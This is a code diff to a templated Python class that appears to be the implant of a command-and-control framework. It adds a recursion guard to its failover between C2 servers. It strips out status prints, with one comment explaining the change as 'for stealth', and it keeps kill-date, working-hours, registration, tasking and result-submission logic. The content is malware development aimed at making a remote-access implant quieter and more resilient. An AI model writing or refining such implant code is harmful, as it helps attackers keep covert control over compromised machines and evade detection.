@@ -104,6 +104,9 @@ class {class_name}:
         self.{v_current_fail_count} = 0
         self.{v_max_fail_count} = 15  # Try main C2 for ~15 * heartbeat_interval before failover
 
+        # Flag to prevent failover recursion
+        self.{v_in_failover_attempt} = False
+
         # Working hours and kill date configurations
         self.{v_kill_date} = "{kill_date}"
         self.{v_working_hours} = {{
@@ -186,6 +189,9 @@ class {class_name}:
         if self.{v_current_fail_count} < self.{v_max_fail_count}:
             return False
 
+        # Set flag to indicate we're in a failover attempt to prevent recursion
+        self.{v_in_failover_attempt} = True
+
         # Try to register with a failover C2
         for failover_url in self.{v_failover_urls}:
             original_c2_url = self.{v_current_c2_url}
@@ -194,23 +200,21 @@ class {class_name}:
             # Try to register with the failover server
             try:
                 if self.{m_register}():
-                    print("[+] Successfully connected to failover C2: " + failover_url)
+                    # Successfully connected to failover C2
                     self.{v_current_fail_count} = 0  # Reset failure count
+                    self.{v_in_failover_attempt} = False  # Reset the flag
                     return True
             except Exception as e:
-                print("[-] Failed to connect to failover C2: " + failover_url + ", error: " + str(e))
-                # Continue to the next URL
                 pass
 
-        # If all failover attempts failed, return to the original main C2
         self.{v_current_c2_url} = original_c2_url
+        self.{v_in_failover_attempt} = False  # Reset the flag
         return False
 
     def {m_increment_fail_count}(self):
         self.{v_current_fail_count} += 1
 
-        # If we've reached the maximum fail count, try failover
-        if self.{v_current_fail_count} >= self.{v_max_fail_count}:
+        if self.{v_current_fail_count} >= self.{v_max_fail_count} and not self.{v_in_failover_attempt}:
             self.{m_try_failover}()
 
     def {m_reset_fail_count}(self):
@@ -263,8 +267,9 @@ class {class_name}:
             self.{m_reset_fail_count}()
             return True
         else:
-            # Increment failure count if registration failed
-            self.{m_increment_fail_count}()
+            # to prevent recursion during failover attempts
+            if not self.{v_in_failover_attempt}:
+                self.{m_increment_fail_count}()
             return False
 
     def {m_get_tasks}(self):
@@ -1340,7 +1345,7 @@ class {class_name}:
                         else:
                             # Increment failure count if submission fails
                             self.{m_increment_fail_count}()
-                            print(f"[-] Failed to submit task result for task {{task_id}}")
+                            # Don't print anything for stealth
 
                 if self.{v_interactive_mode}:
                     sleep_time = 2
